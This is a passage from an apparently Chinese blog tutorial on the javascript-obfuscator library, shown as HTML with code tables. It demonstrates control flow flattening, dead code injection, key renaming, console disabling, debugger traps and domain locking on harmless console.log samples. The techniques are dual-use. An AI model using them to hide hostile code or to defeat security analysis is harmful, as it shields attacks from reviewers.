_0x6bb49f = ~<span class="number">-0x4</span> &gt;&gt; (<span class="number">0x1</span> + (<span class="number">0xff</span> % <span class="number">0x0</span>));</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      _0x2073d6[<span class="string">"\x69\x6e\x64\x65\x78\x4f\x66"</span>]((!![] + <span class="string">""</span>)[<span class="number">0x3</span>]) !== _0x6bb49f</span><br><span class="line">    ) &#123;</span><br><span class="line">      _0x2d9a50(_0x2073d6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span> (!_0x456070()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!_0x3fde69()) &#123;</span><br><span class="line">      _0x2d9a50(<span class="string">"\x69\x6e\x64\u0435\x78\x4f\x66"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      _0x2d9a50(<span class="string">"\x69\x6e\x64\x65\x78\x4f\x66"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    _0x2d9a50(<span class="string">"\x69\x6e\x64\u0435\x78\x4f\x66"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">_0x2c6fd7();</span><br><span class="line"><span class="built_in">console</span>[_0x4391(<span class="string">"0x0"</span>)](_0x4391(<span class="string">"0x1"</span>));</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果我们将上述代码放到控制台，它的执行结果和之前是一模一样的，没有任何问题。</p>
                  <p>如果我们将其进行格式化，然后贴到到浏览器控制台里面，浏览器会直接卡死无法运行。这样如果有人对代码进行了格式化，就无法正常对代码进行运行和调试，从而起到了保护作用。</p>
                  <h3 id="控制流平坦化"><a href="#控制流平坦化" class="headerlink" title="控制流平坦化"></a>控制流平坦化</h3>
                  <p>控制流平坦化其实就是将代码的执行逻辑混淆，使其变得复杂难读。其基本思想是将一些逻辑处理块都统一加上一个前驱逻辑块，每个逻辑块都由前驱逻辑块进行条件判断和分发，构成一个个闭环逻辑，导致整个执行逻辑十分复杂难读。</p>
                  <p>比如说这里有一段示例代码：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="built_in">console</span>.log(c);</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"><span class="built_in">console</span>.log(b);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>代码逻辑一目了然，依次在控制台输出了 c、a、b 三个变量的值，但如果把这段代码进行控制流平坦化处理后，代码就会变成这样：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> s = <span class="string">"3|1|2"</span>.split(<span class="string">"|"</span>);</span><br><span class="line"><span class="keyword">let</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (s[x++]) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"1"</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(a);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"2"</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(b);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"3"</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(c);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，混淆后的代码首先声明了一个变量 s，它的结果是一个列表，其实是 <code>[&quot;3&quot;, &quot;1&quot;, &quot;2&quot;]</code>，然后下面通过 switch 语句对 s 中的元素进行了判断，每个 case 都加上了各自的代码逻辑。通过这样的处理，一些连续的执行逻辑就被打破了，代码被修改为一个 switch 语句，原本我们可以一眼看出的逻辑是控制台先输出 c，然后才是 a、b，但是现在我们必须要结合 switch 的判断条件和对应 case 的内容进行判断，我们很难再一眼每条语句的执行顺序了，这就大大降低了代码的可读性。</p>
                  <p>在 javascript-obfuscator 中我们通过 controlFlowFlattening 变量可以控制是否开启控制流平坦化，示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  controlFlowFlattening: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>使用控制流平坦化可以使得执行逻辑更加复杂难读，目前非常多的前端混淆都会加上这个选项。但启用控制流平坦化之后，代码的执行时间会变长，最长达 1.5 倍之多。</p>
                  <p>另外我们还能使用 controlFlowFlatteningThreshold 这个参数来控制比例，取值范围是 0 到 1，默认 0.75，如果设置为 0，那相当于 controlFlowFlattening 设置为 false，即不开启控制流扁平化 。</p>
                  <h3 id="无用代码注入"><a href="#无用代码注入" class="headerlink" title="无用代码注入"></a>无用代码注入</h3>
                  <p>无用代码即不会被执行的代码或对上下文没有任何影响的代码，注入之后可以对现有的 JavaScript 代码的阅读形成干扰。我们可以使用 deadCodeInjection 参数开启这个选项，默认为 false。</p>
                  <p>比如这里有一段代码：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> a = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> b = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"nice to meet you"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line">b();</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里就声明了方法 a 和 b，然后依次进行调用，分别输出两句话。</p>
                  <p>但经过无用代码注入处理之后，代码就会变成类似这样的结果：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> _0x16c18d = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!![[]]) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"hello world"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"this"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"is"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"dead"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"code"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> _0x1f7292 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">"xmv2nOdfy2N"</span>.charAt(<span class="number">4</span>) !== <span class="built_in">String</span>.fromCharCode(<span class="number">110</span>)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"this"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"is"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"dead"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"code"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"nice to meet you"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">_0x16c18d();</span><br><span class="line">_0x1f7292();</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，每个方法内部都增加了额外的 if else 语句，其中 if 的判断条件还是一个表达式，其结果是 true 还是 false 我们还不太一眼能看出来，比如说 <code>_0x1f7292</code> 这个方法，它的 if 判断条件是：</p>
                  <figure class="highlight reasonml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">"xmv2nOdfy2N"</span>.<span class="built_in">char</span><span class="constructor">At(4)</span> !== <span class="module-access"><span class="module"><span class="identifier">String</span>.</span></span>from<span class="constructor">CharCode(110)</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在不等号前面其实是从字符串中取出指定位置的字符，不等号后面则调用了 fromCharCode 方法来根据 ascii 码转换得到一个字符，然后比较两个字符的结果是否是不一样的。前者经过我们推算可以知道结果是 n，但对于后者，多数情况下我们还得去查一下 ascii 码表才能知道其结果也是 n，最后两个结果是相同的，所以整个表达式的结果是 false，所以 if 后面跟的逻辑实际上就是不会被执行到的无用代码，但这些代码对我们阅读代码起到了一定的干扰作用。</p>
                  <p>因此，这种混淆方式通过混入一些特殊的判断条件并加入一些不会被执行的代码，可以对代码起到一定的混淆干扰作用。</p>
                  <p>在 javascript-obfuscator 中，我们可以通过 deadCodeInjection 参数控制无用代码的注入，配置如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  deadCodeInjection: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>另外我们还可以通过设置 deadCodeInjectionThreshold 参数来控制无用代码注入的比例，取值 0 到 1，默认是 0.4。</p>
                  <h3 id="对象键名替换"><a href="#对象键名替换" class="headerlink" title="对象键名替换"></a>对象键名替换</h3>
                  <p>如果是一个对象，可以使用 transformObjectKeys 来对对象的键值进行替换，示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    var object = &#123;</span></span><br><span class="line"><span class="string">        foo: 'test1',</span></span><br><span class="line"><span class="string">        bar: &#123;</span></span><br><span class="line"><span class="string">            baz: 'test2'</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;)(); </span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  compact: <span class="literal">false</span>,</span><br><span class="line">  transformObjectKeys: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>输出结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x7a5d = [<span class="string">"bar"</span>, <span class="string">"test2"</span>, <span class="string">"test1"</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x59fec5, _0x2e4fac</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x231e7a = <span class="function"><span class="keyword">function</span> (<span class="params">_0x46f33e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x46f33e) &#123;</span><br><span class="line">      _0x59fec5[<span class="string">"push"</span>](_0x59fec5[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x231e7a(++_0x2e4fac);</span><br><span class="line">&#125;)(_0x7a5d, <span class="number">0x167</span>);</span><br><span class="line"><span class="keyword">var</span> _0x3bc4 = <span class="function"><span class="keyword">function</span> (<span class="params">_0x309ad3, _0x22d5ac</span>) </span>&#123;</span><br><span class="line">  _0x309ad3 = _0x309ad3 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x3a034e = _0x7a5d[_0x309ad3];</span><br><span class="line">  <span class="keyword">return</span> _0x3a034e;</span><br><span class="line">&#125;;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x9f1fd1 = &#123;&#125;;</span><br><span class="line">  _0x9f1fd1[<span class="string">"foo"</span>] = _0x3bc4(<span class="string">"0x0"</span>);</span><br><span class="line">  _0x9f1fd1[_0x3bc4(<span class="string">"0x1"</span>)] = &#123;&#125;;</span><br><span class="line">  _0x9f1fd1[_0x3bc4(<span class="string">"0x1"</span>)][<span class="string">"baz"</span>] = _0x3bc4(<span class="string">"0x2"</span>);</span><br><span class="line">&#125;)();</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，Object 的变量名被替换为了特殊的变量，使得可读性变差，这样我们就不好直接通过变量名进行搜寻了，这也可以起到一定的防护作用。</p>
                  <h3 id="禁用控制台输出"><a href="#禁用控制台输出" class="headerlink" title="禁用控制台输出"></a>禁用控制台输出</h3>
                  <p>可以使用 disableConsoleOutput 来禁用掉 console.log 输出功能，加大调试难度，示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">console.log('hello world')</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  disableConsoleOutput: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">var</span> _0x3a39 = [</span><br><span class="line">  <span class="string">"debug"</span>,</span><br><span class="line">  <span class="string">"info"</span>,</span><br><span class="line">  <span class="string">"error"</span>,</span><br><span class="line">  <span class="string">"exception"</span>,</span><br><span class="line">  <span class="string">"trace"</span>,</span><br><span class="line">  <span class="string">"hello\x20world"</span>,</span><br><span class="line">  <span class="string">"apply"</span>,</span><br><span class="line">  <span class="string">"&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)"</span>,</span><br><span class="line">  <span class="string">"console"</span>,</span><br><span class="line">  <span class="string">"log"</span>,</span><br><span class="line">  <span class="string">"warn"</span>,</span><br><span class="line">];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x2a157a, _0x5d9d3b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x488e2c = <span class="function"><span class="keyword">function</span> (<span class="params">_0x5bcb73</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (--_0x5bcb73) &#123;</span><br><span class="line">      _0x2a157a[<span class="string">"push"</span>](_0x2a157a[<span class="string">"shift"</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  _0x488e2c(++_0x5d9d3b);</span><br><span class="line">&#125;)(_0x3a39, <span class="number">0x10e</span>);</span><br><span class="line"><span class="keyword">var</span> _0x5bff = <span class="function"><span class="keyword">function</span> (<span class="params">_0x43bdfc, _0x52e4c6</span>) </span>&#123;</span><br><span class="line">  _0x43bdfc = _0x43bdfc - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0xb67384 = _0x3a39[_0x43bdfc];</span><br><span class="line">  <span class="keyword">return</span> _0xb67384;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _0x349b01 = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x1f484b = !![];</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">_0x5efe0d, _0x33db62</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x20bcd2 = _0x1f484b</span><br><span class="line">      ? <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (_0x33db62) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x77054c = _0x33db62[_0x5bff(<span class="string">"0x0"</span>)](_0x5efe0d, <span class="built_in">arguments</span>);</span><br><span class="line">            _0x33db62 = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">return</span> _0x77054c;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    _0x1f484b = ![];</span><br><span class="line">    <span class="keyword">return</span> _0x20bcd2;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="keyword">var</span> _0x19f538 = _0x349b01(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _0x7ab6e4 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> _0x157bff;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e672c = <span class="built_in">Function</span>(</span><br><span class="line">      <span class="string">"return\x20(function()\x20"</span> + _0x5bff(<span class="string">"0x1"</span>) + <span class="string">");"</span></span><br><span class="line">    );</span><br><span class="line">    _0x157bff = _0x5e672c();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x11028d) &#123;</span><br><span class="line">    _0x157bff = <span class="built_in">window</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!_0x157bff[_0x5bff(<span class="string">"0x2"</span>)]) &#123;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)] = (<span class="function"><span class="keyword">function</span> (<span class="params">_0x7ab6e4</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _0x5a8d9e = &#123;&#125;;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x3"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x4"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x5"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x6"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x7"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x8"</span>)] = _0x7ab6e4;</span><br><span class="line">      _0x5a8d9e[_0x5bff(<span class="string">"0x9"</span>)] = _0x7ab6e4;</span><br><span class="line">      <span class="keyword">return</span> _0x5a8d9e;</span><br><span class="line">    &#125;)(_0x7ab6e4);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x3"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x4"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][<span class="string">"debug"</span>] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x6"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x7"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x8"</span>)] = _0x7ab6e4;</span><br><span class="line">    _0x157bff[_0x5bff(<span class="string">"0x2"</span>)][_0x5bff(<span class="string">"0x9"</span>)] = _0x7ab6e4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">_0x19f538();</span><br><span class="line"><span class="built_in">console</span>[_0x5bff(<span class="string">"0x3"</span>)](_0x5bff(<span class="string">"0xa"</span>));</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>此时，我们如果执行这个代码，发现是没有任何输出的，这里实际上就是将 console 的一些功能禁用了。</p>
                  <h3 id="调试保护"><a href="#调试保护" class="headerlink" title="调试保护"></a>调试保护</h3>
                  <p>我们知道，在 JavaScript 代码中如果加入 debugger 这个关键字，那么在执行到该位置的时候控制它就会进入断点调试模式。如果在代码多个位置都加入 debugger 这个关键字，或者定义某个逻辑来反复执行 debugger，那就会不断进入断点调试模式，原本的代码无法就无法顺畅地执行了。这个过程可以称为调试保护，即通过反复执行 debugger 来使得原来的代码无法顺畅执行。</p>
                  <p>其效果类似于执行了如下代码：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">debugger</span>;</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果我们把这段代码粘贴到控制台，它就会反复地执行 debugger 语句进入断点调试模式，从而干扰正常的调试流程。</p>
                  <p>在 javascript-obfuscator 中可以使用 debugProtection 来启用调试保护机制，还可以使用 debugProtectionInterval 来启用无限 Debug ，使得代码在调试过程中会不断进入断点模式，无法顺畅执行，配置如下：</p>
                  <figure class="highlight yaml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">const</span> <span class="string">options</span> <span class="string">=</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="attr">debugProtection:</span> <span class="literal">true</span><span class="string">,</span></span><br><span class="line">  <span class="attr">debugProtectionInterval:</span> <span class="literal">true</span><span class="string">,</span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>混淆后的代码会不断跳到 debugger 代码的位置，使得整个代码无法顺畅执行，对 JavaScript 代码的调试形成一定的干扰。</p>
                  <h3 id="域名锁定"><a href="#域名锁定" class="headerlink" title="域名锁定"></a>域名锁定</h3>
                  <p>我们还可以通过控制 domainLock 来控制 JavaScript 代码只能在特定域名下运行，这样就可以降低代码被模拟或盗用的风险。</p>
                  <p>示例如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> code = <span class="string">`</span></span><br><span class="line"><span class="string">console.log('hello world')</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">  domainLock: [<span class="string">"cuiqingcai.com"</span>],</span><br><span class="line">&#125;;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们使用了 domainLock 指定了一个域名叫做 cuiqingcai.com，也就是设置了一个域名白名单，混淆后的代码结果如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 